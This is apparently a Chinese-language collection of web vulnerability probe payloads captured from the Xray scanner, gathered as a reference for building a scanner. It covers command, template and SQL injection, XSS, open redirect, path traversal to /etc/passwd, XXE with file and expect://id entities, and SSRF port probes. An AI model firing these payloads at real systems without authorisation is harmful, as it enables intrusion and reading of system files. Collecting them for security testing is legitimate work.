# WEB 漏扫 payload 收集

从热门扫描器的请求流量中收集漏洞探测 payload ，作为自研漏洞扫描参考，payload 中的无规律字符和均为 payload 随机生成

漏洞检测基本原则：
- 随机性
- 兼容性
- 确定性
- 稳定性

## Xray 篇

### 命令/代码注入
```
form=submit\nexpr 967956968 + 870986373
form=submit|expr 975557975 + 826881873 
form=submit$(expr 862697460 + 985788997)
form=submit&set /A 826928544+894328131
form=${@var_dump(md5(479761091))};
form='-var_dump(md5(610751663))-'
form=/*1*/{{896160391+947073433}}
form=${868268572+852296119}
form=${(885971328+918689280)?c}
form=#set($c=816805615+870887710)${c}$c
form=<%- 980656021+824491715 %>
```

### SQL 注入

#### 回显

```
form=submit'and/**/extractvalue(1,concat(char(126),md5(1801244667)))and'
form=submit"and/**/extractvalue(1,concat(char(126),md5(1262626756)))and"
target=extractvalue(1,concat(char(126),md5(1139440625)))
```

#### 盲注

```
form=submit'and(select'1'from/**/cast(md5(1776912497)as/**/int))>'0
form=submit/**/and/**/cast(md5('1500755628')as/**/int)>0
target=convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1321453846')))
form=submit'and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes('MD5','1497551299')))>'0
form=submit鎈'"\(
form=submit'"\(
form=submit'and'm'='m
form=submit'and'p'='f
form=submit"and"c"="c
form=submit"and"c"="g

form=submit'and(select*from(select+sleep(0))a/**/union/**/select+1)='
form=submit'and(select*from(select+sleep(2))a/**/union/**/select+1)='
form=submit"and(select*from(select+sleep(0))a/**/union/**/select+1)="
form=submit"and(select*from(select+sleep(2))a/**/union/**/select+1)="
form=submit'/**/and(select'1'from/**/pg_sleep(0))>'0
form=submit'/**/and(select'1'from/**/pg_sleep(2))>'0
form=submit'and(select+1)>0waitfor/**/delay'0:0:0
form=submit'and(select+1)>0waitfor/**/delay'0:0:2
form=submit'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('k',0)='k
form=submit'/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('k',2)='k
```

### XSS
xray 的 xss payload会根据输出点上下文做相应的检测， DOM 型 xss 仅企业版支持，无法获取测试 payload。
#### 反射型
```
# 输出点在 <script> 中
form=%27-mvhqgcrz-%27
form=%3C%2FScRiPt%3E%3Cvftwqvrtvc%3E

# 输出点在普通 DOM 节点下
form=%3Cxckjeiptrr%3E
%3CsCrIpT%3Exckjeiptrr%3C%2FsCrIpT%3E
```

### 任意跳转检测

```
GET //127.0.0.1.yg1d.com
GET /redirect.php?url=http://127.0.0.1.eukh.com#@127.0.0.1/aaa
GET /redirect.php?url=//127.0.0.1.eukh.com#@127.0.0.1/aaa
GET /redirect.php?url=http:127.0.0.1.nnv9.com#@127.0.0.1/aaa
GET /redirect.php?url=3ekv.com
GET /redirect.php?url=https:16843009
```

### 路径穿越检测
读取 etc/passwd ../数量超过当前路径深度即可，无需完全匹配

```
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
### XML 注入
```
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>
<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY content PUBLIC "a" "file:///etc/passwd">]><a>&content;</a>
<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY content PUBLIC "a" "expect://id">]><a>&content;</a>
<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "http://127.0.0.1:34033/i/daa4e8/1bgq/9x48/">]><a>&content;</a>
```

### SSRF 
参数值带有协议头时触发检测逻辑，做端口探测
```
GET /ssrf.php?_url=http://127.0.0.1:22#@dmain.com/1.png
GET /ssrf.php?_url=http://127.0.0.1:6379#@dmain.com/1.png
GET /ssrf.php?_url=http://127.0.0.1:43017/i/e354b3/dogy/7ma9/
GET /ssrf.php?_url=http://127.0.0.1:43017#@domain.com/i/e0c8ee/dogy/xsuy/
```

## AWVS 篇
